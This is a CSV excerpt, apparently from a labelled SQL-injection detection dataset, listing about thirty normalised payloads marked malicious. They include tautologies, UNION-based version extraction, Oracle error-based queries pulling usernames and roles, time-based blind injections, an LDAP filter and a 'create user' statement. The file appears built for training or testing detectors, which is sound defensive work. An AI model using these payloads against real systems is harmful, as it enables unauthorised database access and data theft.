row_index,payload_norm,label,sqli_type_hint
780,"select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1,
781,"select * from users where id = 1 or 1#""; union select version ( ) ,version ( ) -- 1",1,
782,"select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",1,
783,1 or 1 = 1,1,
784,"""*""",1,
785,replace,1,
786,"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1",1,
787,"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1,
788,"select * from users where id = 1 -@<@ union select null,version ( ) -- 1",1,
789,"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1,
790,"""^""",1,
791,* ( | ( objectclass = * ) ),1,
792,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,
793,limit,1,
794,or 1 = 1#,1,
795,"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1,
796,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,
797,create user name identified by 'pass123',1,
798,"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1,
799,"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1",1,
800,"select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1,
801,select * from users where id = 1 <@1$ or 1 = 1 -- 1,1,
802,"select * from users where id = 1 union select @&&@,version ( ) -- 1",1,
803,"select * from users where id = 1 or ""?["" or 1 = 1 -- 1",1,
804,"select * from users where id = 1 union select !<@,version ( ) -- 1",1,
805,"or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
806,# from wapiti,1,
807,""" or sleep ( __TIME__ ) = """,1,
808,sleep ( __TIME__ ) #,1,
809,"1' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
